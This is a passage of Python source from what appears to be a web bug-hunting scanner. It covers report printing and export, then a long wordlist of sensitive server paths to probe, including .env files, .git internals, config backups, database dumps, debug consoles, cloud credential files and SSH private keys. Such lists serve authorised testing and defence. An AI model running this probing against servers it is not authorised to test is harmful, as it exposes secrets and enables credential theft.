            print(f"  {C.R}Critical:{C.E} {len(crits)}  "
                  f"{C.M}High:{C.E} {len(highs)}  "
                  f"{C.Y}Medium:{C.E} {len(meds)}  "
                  f"{C.G}Low:{C.E} {len(lows)}  "
                  f"Total: {total_vuln}\n")

            # Group by type for display
            printed_types = set()
            for sev_label, sev_list, sev_col in [
                ("CRITICAL", crits, C.R),
                ("HIGH",     highs, C.M),
                ("MEDIUM",   meds,  C.Y),
                ("LOW",      lows,  C.G),
            ]:
                if not sev_list: continue
                # Group by vuln type
                by_type: Dict[str, list] = {}
                for f in sev_list:
                    by_type.setdefault(f["type"], []).append(f)
                for vtype, findings in by_type.items():
                    tkey = f"{sev_label}_{vtype}"
                    if tkey in printed_types: continue
                    printed_types.add(tkey)
                    print(f"  {sev_col}[{sev_label}]{C.E}  {C.BOLD}{vtype}{C.E}  "
                          f"{C.DIM}({len(findings)} URLs){C.E}")
                    shown = 0
                    for f in findings[:8]:
                        param_str = f"  param={C.CY}{f['param']}{C.E}" if f.get("param") else ""
                        print(f"    {C.G}→{C.E} {f['url'][:80]}{param_str}")
                        if f.get("param") and f.get("test_url"):
                            print(f"      {C.DIM}Test: {f['test_url'][:90]}{C.E}")
                        shown += 1
                    if len(findings) > 8:
                        print(f"    {C.DIM}... and {len(findings)-8} more{C.E}")
                    print()

        # ── URL Parameters Summary ─────────────────────────────────────
        if self.params_found:
            sep("PARAMETER INVENTORY")
            # Collect unique param names and their URLs
            param_registry: Dict[str, List[str]] = {}
            for entry in self.params_found:
                for p in entry["params"]:
                    param_registry.setdefault(p.lower(), []).append(entry["url"])
            # Classify each param
            all_classified = {}
            for pname, urls in param_registry.items():
                for vtype, plist in PARAM_VULN_MAP.items():
                    if pname in plist:
                        all_classified.setdefault(vtype, {})[pname] = urls
                        break
            if all_classified:
                print(f"  {C.Y}Potentially vulnerable parameters found:{C.E}\n")
                for vtype, params in all_classified.items():
                    sev = VULN_SEVERITY.get(vtype, "Medium")
                    sev_col = C.R if sev=="Critical" else C.M if sev=="High" else C.Y if sev=="Medium" else C.G
                    print(f"  {sev_col}[{sev}]{C.E} {C.BOLD}{vtype}{C.E}")
                    for pname, urls in list(params.items())[:10]:
                        payload = VULN_TEST_PAYLOADS.get(vtype,"FUZZ")
                        print(f"    param: {C.CY}{pname}{C.E}  seen in {len(urls)} URL(s)")
                        for u in urls[:2]:
                            print(f"      {C.DIM}{u[:80]}{C.E}")
                    print()

        # ── Emails ────────────────────────────────────────────────────
        if self.emails:
            print(f"  {C.Y}Emails discovered ({len(self.emails)}):{C.E}")
            for e in sorted(self.emails)[:15]:
                print(f"    {C.G}✉ {e}{C.E}")
            print()

        # ── Data Leaks ────────────────────────────────────────────────
        if self.sensitive:
            print(f"  {C.R}⚠ Potential Data Leaks in Source ({len(self.sensitive)}):{C.E}")
            for s in self.sensitive[:10]:
                print(f"    {C.R}{s[:110]}{C.E}")
            print()

        # ── Forms with File Upload ────────────────────────────────────
        if self.forms:
            uploads = [f for f in self.forms if f.get("has_file_upload")]
            if uploads:
                print(f"  {C.Y}File Upload Forms ({len(uploads)}) — potential unrestricted upload:{C.E}")
                for fm in uploads[:5]:
                    print(f"    {C.G}→{C.E} {fm['method']} {fm['action'][:70]}")
            print(f"  {C.DIM}Total forms: {len(self.forms)}{C.E}")

        # ── HTML Comments ─────────────────────────────────────────────
        if self.comments:
            print(f"\n  {C.Y}HTML Comments ({len(self.comments)}, first 5):{C.E}")
            for c in self.comments[:5]:
                print(f"    {C.DIM}<!-- {c[:80]} -->{C.E}")

        # ── Export prompt ─────────────────────────────────────────────
        if total_vuln or self.params_found:
            print()
            ans = ask("Export full bug-hunting report to file? [Y/n]","y").lower()
            if ans == "y":
                self._export_vuln_urls()

        report = {
            "pages_crawled": len(self.visited),
            "internal": sorted(list(self.internal)),
            "external": sorted(list(self.external)),
            "js": sorted(list(self.js_files)),
            "css": sorted(list(self.css_files)),
            "emails": sorted(list(self.emails)),
            "forms": self.forms,
            "comments": self.comments,
            "media": {
                "images": sorted(list(self.images)),
                "gifs": sorted(list(self.gifs)),
                "videos": sorted(list(self.videos)),
                "audio": sorted(list(self.audio)),
                "documents": sorted(list(self.documents)),
                "archives": sorted(list(self.archives)),
            },
            "vuln_urls": {k:[i['url'] for i in v] for k,v in self.vuln_urls.items()},
            "params_found": self.params_found,
            "sensitive_leaks": self.sensitive,
        }
        self.logger.save("web_crawler", report)
        return report

    def _export_vuln_urls(self):
        os.makedirs(Config.LOG_DIR, exist_ok=True)
        ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(Config.LOG_DIR, f"bughunt_report_{ts}.txt")
        sev_order = {"Critical":0,"High":1,"Medium":2,"Low":3}
        all_findings = []
        for vtype, items in self.vuln_urls.items():
            for item in items:
                all_findings.append(item)
        all_findings.sort(key=lambda x: sev_order.get(x.get("severity","Medium"),9))

        with open(path,"w",encoding="utf-8") as f:
            f.write("="*70 + "\n")
            f.write(f"  BUG HUNTING REPORT — {self.start}\n")
            f.write(f"  Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*70 + "\n\n")
            # Summary
            crits = sum(1 for x in all_findings if x.get("severity")=="Critical")
            highs = sum(1 for x in all_findings if x.get("severity")=="High")
            meds  = sum(1 for x in all_findings if x.get("severity")=="Medium")
            lows  = sum(1 for x in all_findings if x.get("severity")=="Low")
            f.write("SUMMARY\n" + "─"*40 + "\n")
            f.write(f"  Pages Crawled   : {len(self.visited)}\n")
            f.write(f"  Param URLs      : {len(self.params_found)}\n")
            f.write(f"  Total Findings  : {len(all_findings)}\n")
            f.write(f"  Critical        : {crits}\n")
            f.write(f"  High            : {highs}\n")
            f.write(f"  Medium          : {meds}\n")
            f.write(f"  Low             : {lows}\n\n")
            # Findings by type
            f.write("FINDINGS (sorted by severity)\n" + "─"*40 + "\n")
            for finding in all_findings:
                sev  = finding.get("severity","Medium")
                vtyp = finding.get("type","?")
                url  = finding.get("url","")
                param = finding.get("param")
                test  = finding.get("test_url","")
                f.write(f"\n[{sev}] {vtyp}\n")
                f.write(f"  URL   : {url}\n")
                if param:
                    f.write(f"  Param : {param}\n")
                if test and test != url:
                    f.write(f"  Test  : {test}\n")
            # All param URLs
            f.write(f"\n\nALL PARAMETER URLs\n{'─'*40}\n")
            for p in self.params_found:
                f.write(f"{p['url']}  params=[{', '.join(p['params'])}]\n")
            # Emails
            if self.emails:
                f.write("\n\nEMAILS FOUND\n" + "─"*40 + "\n")
                for e in sorted(self.emails):
                    f.write(f"{e}\n")
            # Leaks
            if self.sensitive:
                f.write("\n\nPOTENTIAL DATA LEAKS\n" + "─"*40 + "\n")
                for s in self.sensitive:
                    f.write(f"{s}\n")
            # Forms
            if self.forms:
                f.write("\n\nFORMS\n" + "─"*40 + "\n")
                for fm in self.forms:
                    f.write(f"[{fm['method']}] {fm['action']}\n")
                    for inp in fm.get("inputs",[]):
                        _iname = inp.get('name', '')
                        _itype = inp.get('type', 'text')
                        f.write(f"  input name={_iname}  type={_itype}\n")
        cprint(C.G, f"\n[✔] Bug-hunting report saved: {path}")


# ════════════
#  MODULE 4 – SENSITIVE FILE SCANNER  (Massively Expanded)
# ═════════════
SENSITIVE_PATHS = [
    # ── Environment ──────────────────────────────
    "/.env","/.env.local","/.env.backup","/.env.production",
    "/.env.staging","/.env.development","/.env.test","/.env.example",
    "/.env.sample","/.env.dist","/.env.dev","/.env.prod",
    "/.env.bak","/.env.old","/.env.save","/.env.swp","/.env~",
    "/.env.orig","/.env.copy","/.env.tmp","/.env.php",
    "/.env.json","/.env.yaml","/.env.yml","/.env.xml",
    "/.env.ini","/.env.conf","/.env.config",
    "/.env.local.php","/.env.local.json",
    "/.env.local.yaml","/.env.local.yml",
    "/.env.local.xml","/.env.local.ini",
    # ── Git / SVN / Mercurial ────────────────────
    "/.git/config","/.git/HEAD","/.git/COMMIT_EDITMSG","/.git/index",
    "/.git/packed-refs","/.git/refs/heads/master","/.git/refs/heads/main",
    "/.git/refs/tags/v1.0","/.git/refs/tags/v1.0.0",
    "/.gitignore","/.gitattributes","/.gitmodules","/.gitkeep",
    "/.git/logs/HEAD","/.git/logs/refs/heads/master",
    "/.git/logs/refs/heads/main",
    "/.svn/entries","/.svn/wc.db","/.svn/format",
    "/.svn/pristine/","/.svn/tmp/","/.svn/prop-base/",
    "/.hg/hgrc","/.hg/store/","/.hg/requires",
    "/.bzr/branch/branch.conf","/.bzr/README",
    # ── CMS Configs ──────────────────────────────
    "/wp-config.php","/wp-config.php.bak","/wp-config.php.old",
    "/wp-config.php~","/wp-config-sample.php","/wp-config.php.save",
    "/wp-config.php.swp","/wp-config.php.orig","/wp-config.php.copy",
    "/wp-config.php.tmp","/wp-config.php.txt","/wp-config.php.html",
    "/wp-config.php.dist","/wp-config.php.example",
    "/wp-config.php.inc","/wp-config.php.inc.bak",
    "/sites/default/settings.php","/sites/default/default.settings.php",
    "/sites/default/settings.php.bak","/sites/default/settings.php.old",
    "/sites/default/settings.php~","/sites/default/settings.php.save",
    "/sites/default/settings.php.swp","/sites/default/settings.php.orig",
    "/configuration.php","/configuration.php.bak","/configuration.php.old",
    "/configuration.php~","/configuration.php.save","/configuration.php.swp",
    "/configuration.php.orig","/configuration.php.txt",
    "/configuration.php-dist","/configuration.php.example",
    "/local.xml","/app/etc/local.xml","/app/etc/local.xml.bak",
    "/app/etc/local.xml.old","/app/etc/local.xml~",
    "/app/etc/config.php","/app/etc/env.php",
    "/config.php","/config.php.bak","/config.php.old","/config.php~",
    "/config.php.save","/config.php.swp","/config.php.orig",
    "/config.php.copy","/config.php.tmp","/config.php.txt",
    "/config.inc.php","/config.inc.php.bak","/config.inc.php.old",
    "/config.inc.php~","/config.inc.php.save","/config.inc.php.swp",
    "/config.inc.php.orig","/config.inc.php.copy","/config.inc.php.tmp",
    "/config.inc.php.txt","/config.inc.php.example",
    "/config.inc","/config.inc.bak","/config.inc.old",
    "/config.inc~","/config.inc.save","/config.inc.swp",
    "/config.inc.orig","/config.inc.copy","/config.inc.tmp",
    "/config.inc.txt","/config.inc.example",
    "/settings.php","/settings.php.bak","/settings.php.old",
    "/settings.php~","/settings.php.save","/settings.php.swp",
    "/settings.php.orig","/settings.php.copy","/settings.php.tmp",
    "/settings.php.txt","/settings.php.example",
    "/settings.py","/settings.py.bak","/settings.py.old",
    "/settings.py~","/settings.py.save","/settings.py.swp",
    "/settings.py.orig","/settings.py.copy","/settings.py.tmp",
    "/settings.py.txt","/settings.py.example",
    "/settings.rb","/settings.rb.bak","/settings.rb.old",
    "/settings.yml","/settings.yaml","/settings.json",
    "/settings.xml","/settings.ini","/settings.conf",
    "/config.yml","/config.yaml","/config.json","/config.xml",
    "/config.ini","/config.conf","/config.config",
    "/config.yml.bak","/config.yaml.bak","/config.json.bak",
    "/config.xml.bak","/config.ini.bak","/config.conf.bak",
    "/config.yml.old","/config.yaml.old","/config.json.old",
    "/config.xml.old","/config.ini.old","/config.conf.old",
    "/config.yml~","/config.yaml~","/config.json~",
    "/config.xml~","/config.ini~","/config.conf~",
    "/config.yml.save","/config.yaml.save","/config.json.save",
    "/config.xml.save","/config.ini.save","/config.conf.save",
    "/config.yml.swp","/config.yaml.swp","/config.json.swp",
    "/config.xml.swp","/config.ini.swp","/config.conf.swp",
    "/config.yml.orig","/config.yaml.orig","/config.json.orig",
    "/config.xml.orig","/config.ini.orig","/config.conf.orig",
    "/web.config","/web.config.bak","/web.config.old","/web.config~",
    "/web.config.save","/web.config.swp","/web.config.orig",
    "/appsettings.json","/appsettings.json.bak",
    "/appsettings.json.old","/appsettings.json~",
    "/appsettings.Development.json","/appsettings.Production.json",
    "/appsettings.Staging.json",
    "/application.properties","/application.yml","/application.yaml",
    "/application.properties.bak","/application.yml.bak",
    "/application.properties.old","/application.yml.old",
    "/bootstrap.php","/bootstrap.php.bak","/bootstrap.php.old",
    "/bootstrap.php~","/bootstrap.php.save","/bootstrap.php.swp",
    "/bootstrap.php.orig","/bootstrap.php.copy","/bootstrap.php.tmp",
    "/bootstrap.php.txt","/bootstrap.php.example",
    # ── Info / Debug ─────────────────────────────
    "/phpinfo.php","/info.php","/test.php","/debug.php","/status.php",
    "/server-status","/server-info","/server-status?auto",
    "/_profiler","/telescope","/telescope/","/telescope/requests",
    "/telescope/exceptions","/telescope/logs","/telescope/queries",
    "/telescope/mail","/telescope/redis","/telescope/gates",
    "/telescope/schedule","/telescope/commands",
    "/debug/default/view","/debug/toolbar",
    "/_ignition/health-check","/_ignition/execute-solution",
    "/_ignition/scripts","/_ignition/styles",
    "/_ignition/share-report","/_ignition/update-config",
    "/__debug__/","/__debug__/sql/","/__debug__/settings/",
    "/__clockwork/","/__clockwork/latest","/__clockwork/app",
    "/clockwork/","/clockwork/app","/clockwork/latest",
    "/horizon","/horizon/","/horizon/dashboard",
    "/horizon/jobs","/horizon/metrics","/horizon/commands",
    "/health","/health/","/healthcheck","/health-check",
    "/healthz","/ready","/readyz","/live","/livez",
    "/status","/status/","/ping","/ping/","/pong",
    "/version","/version/","/api/version","/api/health",
    # ── Backups ──────────────────────────────────
    "/backup.sql","/backup.tar.gz","/backup.zip","/backup.tar",
    "/backup.tar.bz2","/backup.tar.xz","/backup.rar",
    "/dump.sql","/dump.sql.gz","/dump.tar.gz","/dump.zip",
    "/database.sql","/database.sql.gz","/database.tar.gz",
    "/database.zip","/database.dump",
    "/db.sql","/db.sql.gz","/db.tar.gz","/db.zip","/db.dump",
    "/data.sql","/data.sql.gz","/data.tar.gz","/data.zip",
    "/backup/database.sql","/backups/backup.sql",
    "/backup/database.sql.gz","/backups/database.sql.gz",
    "/www.tar.gz","/www.zip","/www.tar","/www.rar",
    "/site.tar.gz","/site.zip","/site.tar","/site.rar",
    "/public_html.zip","/public_html.tar.gz",
    "/html.zip","/html.tar.gz","/htdocs.zip","/htdocs.tar.gz",
    "/web.zip","/web.tar.gz","/website.zip","/website.tar.gz",
    "/app.zip","/app.tar.gz","/application.zip","/application.tar.gz",
    "/src.zip","/src.tar.gz","/source.zip","/source.tar.gz",
    "/code.zip","/code.tar.gz","/project.zip","/project.tar.gz",
    "/backup/","/backups/","/bak/","/baks/","/old/","/olds/",
    "/archive/","/archives/","/arch/","/archives/old/",
    "/backup_2024","/backup_2023","/backup_2022",
    "/backup_2024.tar.gz","/backup_2023.tar.gz",
    "/backup_2024.zip","/backup_2023.zip",
    "/db_backup.sql","/db_backup.sql.gz",
    "/mysql_backup.sql","/mysql_backup.sql.gz",
    "/database_backup.sql","/database_backup.sql.gz",
    # ── Logs ─────────────────────────────────────
    "/error_log","/error.log","/debug.log","/access.log",
    "/app.log","/application.log","/server.log","/system.log",
    "/error_log.bak","/error.log.bak","/access.log.bak",
    "/logs/","/logs/error.log","/logs/access.log","/logs/app.log",
    "/logs/debug.log","/logs/server.log","/logs/system.log",
    "/logs/error_log","/logs/access_log","/logs/app_log",
    "/log/","/log/error.log","/log/access.log","/log/app.log",
    "/log/debug.log","/log/server.log","/log/system.log",
    "/log/error_log","/log/access_log","/log/app_log",
    "/var/log/","/var/log/error.log","/var/log/access.log",
    "/var/log/app.log","/var/log/debug.log","/var/log/server.log",
    "/var/log/nginx/error.log","/var/log/nginx/access.log",
    "/var/log/apache2/error.log","/var/log/apache2/access.log",
    "/var/log/httpd/error_log","/var/log/httpd/access_log",
    "/var/log/mysql/error.log","/var/log/mysql.log",
    "/var/log/php_errors.log","/var/log/php-fpm.log",
    "/storage/logs/","/storage/logs/laravel.log",
    "/storage/logs/error.log","/storage/logs/app.log",
    "/storage/logs/debug.log","/storage/logs/server.log",
    "/storage/logs/system.log","/storage/logs/queue.log",
    "/storage/framework/","/storage/framework/cache/",
    "/storage/framework/sessions/","/storage/framework/views/",
    "/storage/app/","/storage/app/public/",
    "/tmp/","/tmp/error.log","/tmp/debug.log","/tmp/app.log",
    "/tmp/error_log","/tmp/access_log",
    "/temp/","/temp/error.log","/temp/debug.log",
    "/temp/error_log","/temp/access_log",
    # ── Install / Setup ──────────────────────────
    "/install.php","/install.sql","/setup.php","/upgrade.php",
    "/installer/","/setup/","/install/","/upgrade/",
    "/install/index.php","/install/index.html",
    "/setup/index.php","/setup/index.html",
    "/installer/index.php","/installer/index.html",
    "/install.php.bak","/install.php.old","/install.php~",
    "/setup.php.bak","/setup.php.old","/setup.php~",
    "/upgrade.php.bak","/upgrade.php.old","/upgrade.php~",
    "/install.bak","/install.old","/install~",
    "/setup.bak","/setup.old","/setup~",
    "/upgrade.bak","/upgrade.old","/upgrade~",
    # ── Packages / Dependencies ───────────────────
    "/composer.json","/composer.lock","/composer.phar",
    "/package.json","/package-lock.json","/yarn.lock",
    "/pnpm-lock.yaml","/npm-shrinkwrap.json",
    "/Gemfile","/Gemfile.lock","/requirements.txt",
    "/Pipfile","/Pipfile.lock","/poetry.lock","/pyproject.toml",
    "/go.mod","/go.sum","/Cargo.toml","/Cargo.lock",
    "/pom.xml","/build.gradle","/build.gradle.kts",
    "/settings.gradle","/build.sbt","/build.xml",
    "/Makefile","/CMakeLists.txt","/configure.ac",
    "/Rakefile","/Brewfile","/Podfile","/Podfile.lock",
    "/Cartfile","/Cartfile.resolved",
    # ── Docker / CI / CD ─────────────────────────
    "/Dockerfile","/Dockerfile.prod","/Dockerfile.dev",
    "/Dockerfile.test","/Dockerfile.local",
    "/docker-compose.yml","/docker-compose.yaml",
    "/docker-compose.override.yml","/docker-compose.override.yaml",
    "/docker-compose.prod.yml","/docker-compose.dev.yml",
    "/docker-compose.test.yml","/docker-compose.local.yml",
    "/.dockerignore","/.dockerenv",
    "/.travis.yml","/.travis.yaml",
    "/.circleci/config.yml","/.circleci/config.yaml",
    "/.github/workflows/","/.github/workflows/main.yml",
    "/.github/workflows/deploy.yml","/.github/workflows/ci.yml",
    "/Jenkinsfile","/Jenkinsfile.prod","/Jenkinsfile.dev",
    "/.drone.yml","/.drone.yaml",
    "/.gitlab-ci.yml","/.gitlab-ci.yaml",
    "/.gitlab/","/.gitlab/merge_request_templates/",
    "/appveyor.yml","/appveyor.yaml",
    "/azure-pipelines.yml","/azure-pipelines.yaml",
    "/.azure/","/.azure/credentials",
    "/.buildkite/","/.buildkite/pipeline.yml",
    "/.circleci/","/.circleci/config.yml",
    "/.travis.ini","/.travis.toml",
    "/cloudbuild.yaml","/cloudbuild.yml",
    "/buildspec.yml","/buildspec.yaml",
    # ── API / Swagger ────────────────────────────
    "/swagger.json","/swagger.yaml","/swagger.yml",
    "/openapi.json","/openapi.yaml","/openapi.yml",
    "/api-docs","/api-docs.json","/api-docs.yaml",
    "/api/swagger.json","/api/openapi.json",
    "/docs/api","/docs/api/","/api/docs",
    "/swagger-ui.html","/swagger-ui/","/swagger-ui/index.html",
    "/swagger-resources/","/swagger-resources/configuration/ui",
    "/swagger-resources/configuration/security",
    "/v2/api-docs","/v3/api-docs","/v2/api-docs/",
    "/v3/api-docs/","/v3/api-docs/swagger-config",
    "/webjars/springfox-swagger-ui/",
    "/graphql","/graphiql","/graphql/console",
    "/graphql/playground","/altair","/voyager",
    "/api/graphql","/gql","/query",
    "/postman","/postman/collection","/api-collection",
    "/postman_collection.json","/collection.json",
    # ── Security / Misc ──────────────────────────
    "/.htaccess","/.htaccess.bak","/.htaccess.old","/.htaccess~",
    "/.htaccess.save","/.htaccess.swp","/.htaccess.orig",
    "/.htpasswd","/.htpasswd.bak","/.htpasswd.old","/.htpasswd~",
    "/crossdomain.xml","/clientaccesspolicy.xml",
    "/.well-known/security.txt","/.well-known/apple-app-site-association",
    "/.well-known/change-password","/.well-known/openid-configuration",
    "/.well-known/assetlinks.json","/.well-known/webfinger",
    "/.well-known/host-meta","/.well-known/host-meta.json",
    "/.well-known/oauth-authorization-server",
    "/security.txt","/humans.txt","/README.md","/README",
    "/README.txt","/README.html","/CHANGELOG","/CHANGELOG.md",
    "/CHANGELOG.txt","/CHANGELOG.html","/VERSION","/VERSION.txt",
    "/LICENSE","/LICENSE.md","/LICENSE.txt",
    "/Thumbs.db","/.DS_Store","/.Spotlight-V100","/.Trashes",
    "/.fseventsd","/.TemporaryItems","/.DocumentRevisions-V100",
    "/desktop.ini","/Desktop.ini",
    "/favicon.ico","/robots.txt","/robots.txt.bak",
    "/sitemap.xml","/sitemap_index.xml","/sitemap-index.xml",
    "/sitemap.xml.gz","/sitemap_index.xml.gz",
    # ── Cloud Credentials ────────────────────────
    "/.aws/credentials","/.aws/config","/.aws/cli/",
    "/.aws/","/.aws/sso/cache/",
    "/.azure/","/.azure/credentials","/.azure/config",
    "/.azure/accessTokens.json","/.azure/azureProfile.json",
    "/.config/gcloud/","/.config/gcloud/credentials.db",
    "/.config/gcloud/access_tokens.db",
    "/.config/gcloud/application_default_credentials.json",
    "/gcloud/","/gcloud/credentials.db",
    "/.kube/config","/.kube/","/kubeconfig","/kubeconfig.yaml",
    "/kubeconfig.json","/kube/config",
    "/.docker/config.json","/.docker/","/.docker/daemon.json",
    # ── SSH / Keys ───────────────────────────────
    "/.ssh/id_rsa","/.ssh/id_dsa","/.ssh/id_ecdsa",
    "/.ssh/id_ed25519","/.ssh/known_hosts","/.ssh/config",
    "/.ssh/authorized_keys","/.ssh/","/.ssh/identity",
    "/.ssh/id_rsa.pub","/.ssh/id_dsa.pub",
    "/id_rsa","/id_dsa","/id_ecdsa","/id_ed25519",
    "/id_rsa.pub","/id_dsa.pub","/id_ecdsa.pub","/id_ed25519.pub",
    "/private.key","/private.pem","/server.key","/server.pem",
    "/cert.pem","/cert.key","/ssl.key","/ssl.pem",
    "/keystore.jks","/truststore.jks","/.keystore",
    "/.jks","/.p12","/.pfx","/.pkcs12",
    # ── IDE / Editor ─────────────────────────────
    "/.idea/","/.idea/workspace.xml","/.idea/misc.xml",
    "/.vscode/","/.vscode/settings.json","/.vscode/launch.json",
    "/.vscode/tasks.json","/.vscode/extensions.json",
    "/.project","/.classpath","/.settings/",
    "/.sublime-project","/.sublime-workspace",
    "/*.sublime-project","/*.sublime-workspace",
    "/.editorconfig","/.prettierrc","/.eslintrc",
    "/.eslintrc.js","/.eslintrc.json","/.eslintrc.yml",
    "/.stylelintrc","/.stylelintrc.json",
    "/.babelrc","/.browserslistrc",
    "/.nvmrc","/.node-version","/.ruby-version",
    "/.python-version","/.tool-versions",
    "/.jest/","/.mocha/","/.nyc_output/",
    # ── Database ─────────────────────────────────
    "/phpmyadmin/","/phpmyadmin/index.php","/phpmyadmin/setup/",
    "/phpmyadmin/scripts/setup.php","/phpmyadmin/Documentation.html",
    "/phpmyadmin/README","/phpmyadmin/ChangeLog",
    "/phpMyAdmin/","/phpMyAdmin/index.php",
    "/pma/","/pma/index.php","/pma/setup/",
    "/adminer/","/adminer/index.php","/adminer.php",
    "/adminer-4.8.1.php","/adminer-4.8.0.php",
    "/adminer-4.7.9.php","/adminer-4.7.8.php",
    "/adminer-4.7.7.php","/adminer-4.7.6.php",
    "/adminer-4.7.5.php","/adminer-4.7.4.php",
    "/adminer-4.7.3.php","/adminer-4.7.2.php",
    "/mysql/","/mysql/index.php","/mysql/admin/",
    "/myadmin/","/myadmin/index.php",
    "/sqladmin/","/sqladmin/index.php",
    "/dbadmin/","/dbadmin/index.php",
    "/pgadmin/","/pgadmin/index.php","/pgadmin4/",
    "/phppgadmin/","/phppgadmin/index.php",
    "/db/","/db/index.php","/db/admin/",
    "/database/","/database/index.php",
    "/mongo/","/mongodb/","/mongodb/admin/",
    "/redis/","/redis/","/redisadmin/","/redisadmin/",
    "/memcached/","/memcached/","/memcached.php",
    "/elasticsearch/","/elasticsearch/","/_cat/","/_cluster/",
    "/_nodes/","/_search","/_stats","/_mapping",
    "/couchdb/","/couchdb/","/_utils/",
    "/influxdb/","/influxdb/","/query",
    "/clickhouse/","/clickhouse/","/play",
    "/cassandra/","/cassandra/",
    "/neo4j/","/neo4j/","/browser/",
    "/orientdb/","/orientdb/",
    "/solr/","/solr/","/solr/admin/",
    "/rabbitmq/","/rabbitmq/","/rabbitmq/management/",
    "/kibana/","/kibana/","/app/kibana",
    "/grafana/","/grafana/","/grafana/login",
    # ── WordPress Specific ───────────────────────
    "/wp-content/debug.log","/wp-content/uploads/",
    "/wp-content/plugins/","/wp-content/themes/",
    "/wp-content/mu-plugins/","/wp-content/upgrade/",
    "/wp-content/updraft/","/wp-content/ai1wm-backups/",
    "/wp-content/backup/","/wp-content/backups/",
    "/wp-content/cache/","/wp-content/logs/",
    "/wp-content/advanced-cache.php","/wp-content/object-cache.php",
    "/wp-content/db.php","/wp-content/install.php",
    "/wp-content/sunrise.php","/wp-content/advanced-cache.php",
    "/wp-content/wp-cache-config.php",
    "/wp-includes/","/wp-includes/css/","/wp-includes/js/",
    "/wp-includes/images/","/wp-includes/fonts/",
    "/wp-includes/ID3/","/wp-includes/IXR/",
    "/wp-includes/PHPMailer/","/wp-includes/Requests/",
    "/wp-includes/SimplePie/","/wp-includes/Text/",
    "/xmlrpc.php","/wp-cron.php","/wp-trackback.php",
    "/wp-links-opml.php","/wp-signup.php","/wp-activate.php",
    "/wp-comments-post.php","/wp-mail.php",
    "/wp-admin/","/wp-admin/admin.php","/wp-admin/admin-ajax.php",
    "/wp-admin/setup-config.php","/wp-admin/install.php",
    "/wp-admin/upgrade.php","/wp-admin/plugins.php",
    "/wp-admin/themes.php","/wp-admin/users.php",
    "/wp-admin/tools.php","/wp-admin/options.php",
    "/wp-admin/options-writing.php","/wp-admin/options-reading.php",
    "/wp-admin/options-discussion.php","/wp-admin/options-media.php",
    "/wp-admin/options-permalink.php","/wp-admin/options-privacy.php",
    "/wp-admin/edit.php","/wp-admin/edit-comments.php",
    "/wp-admin/upload.php","/wp-admin/media-new.php",
    "/wp-admin/media.php","/wp-admin/export.php",
    "/wp-admin/import.php","/wp-admin/site-health.php",
    "/wp-admin/customize.php","/wp-admin/nav-menus.php",
    "/wp-admin/widgets.php","/wp-admin/plugin-install.php",
    "/wp-admin/theme-install.php","/wp-admin/update-core.php",
    "/wp-admin/update.php","/wp-admin/network/",
    "/wp-admin/network/admin.php","/wp-admin/network/settings.php",
    "/wp-admin/network/sites.php","/wp-admin/network/users.php",
    "/wp-admin/network/themes.php","/wp-admin/network/plugins.php",
    "/wp-admin/network/upgrade.php","/wp-admin/ms-admin.php",
    "/wp-admin/ms-sites.php","/wp-admin/ms-users.php",
    "/wp-admin/ms-themes.php","/wp-admin/ms-options.php",
    "/wp-admin/ms-delete-site.php","/wp-json/",
    "/wp-json/wp/v2/","/wp-json/wp/v2/pages",
    "/wp-json/wp/v2/posts","/wp-json/wp/v2/comments",
    "/wp-json/wp/v2/media","/wp-json/wp/v2/categories",
    "/wp-json/wp/v2/tags","/wp-json/wp/v2/settings",
    "/wp-json/wp/v2/statuses","/wp-json/wp/v2/taxonomies",
    "/wp-json/wp/v2/types","/wp-json/wp/v2/users",
    "/wp-json/wp/v2/users/me","/wp-json/wp/v2/users/1",
    "/wp-json/oembed/1.0/embed","/wp-json/contact-form-7/v1/contact-forms",
    "/wp-json/wp-site-health/v1/tests/background-updates",
    "/readme.html","/license.txt","/wp-links-opml.php",
    "/?rest_route=/wp/v2/users","/?rest_route=/wp/v2/posts",
    "/?author=1","/?author=2","/?author=3",
    "/wp-content/uploads/2024/","/wp-content/uploads/2023/",
    "/wp-content/uploads/2022/","/wp-content/uploads/2021/",
    "/wp-content/uploads/2020/","/wp-content/uploads/2019/",
    "/wp-content/uploads/2018/","/wp-content/uploads/2017/",
    "/wp-content/uploads/2016/","/wp-content/uploads/2015/",
    "/wp-content/uploads/wpforms/","/wp-content/uploads/elementor/",
    "/wp-content/uploads/gravity_forms/","/wp-content/uploads/wpcf7_uploads/",
    "/wp-content/uploads/sucuri/","/wp-content/uploads/wordfence/",
    "/wp-content/uploads/backup/","/wp-content/uploads/backup-db/",
    "/wp-content/uploads/woocommerce_uploads/",
    "/wp-content/uploads/woocommerce_transient_files/",
    "/wp-content/uploads/woocommerce_logs/",
    "/wp-content/uploads/avada/","/wp-content/uploads/divi/",
    "/wp-content/uploads/et-cache/","/wp-content/uploads/bb-plugin/",
    "/wp-content/uploads/beaver-builder/","/wp-content/uploads/oxygen/",
    "/wp-content/uploads/bricks/","/wp-content/uploads/wpbakery/",
    "/wp-content/uploads/js_composer/","/wp-content/uploads/revslider/",
    "/wp-content/plugins/elementor/","/wp-content/plugins/woocommerce/",
    "/wp-content/plugins/contact-form-7/",
    "/wp-content/plugins/wordfence/","/wp-content/plugins/akismet/",
    "/wp-content/plugins/jetpack/","/wp-content/plugins/yoast/",
    "/wp-content/plugins/all-in-one-seo-pack/",
    "/wp-content/plugins/google-analytics-for-wordpress/",
    "/wp-content/plugins/monsterinsights/",
    "/wp-content/plugins/advanced-custom-fields/",
    "/wp-content/plugins/advanced-custom-fields-pro/",
    "/wp-content/plugins/wpforms-lite/","/wp-content/plugins/wpforms/",
    "/wp-content/plugins/gravityforms/","/wp-content/plugins/ninja-forms/",
    "/wp-content/plugins/instagram-feed/",
    "/wp-content/plugins/updraftplus/","/wp-content/plugins/backup/",
    "/wp-content/plugins/duplicator/","/wp-content/plugins/all-in-one-wp-migration/",
    "/wp-content/plugins/wp-file-manager/",
    "/wp-content/plugins/file-manager/",
    "/wp-content/plugins/revslider/","/wp-content/plugins/slider-revolution/",
    "/wp-content/themes/","/wp-content/themes/twentytwentyfour/",
    "/wp-content/themes/twentytwentythree/",
    "/wp-content/themes/twentytwentytwo/",
    "/wp-content/themes/astra/","/wp-content/themes/oceanwp/",
    "/wp-content/themes/generatepress/","/wp-content/themes/hello-elementor/",
    "/wp-content/themes/kadence/","/wp-content/themes/storefront/",
    "/wp-content/themes/twentytwentyone/",
    "/wp-content/themes/twentytwenty/",
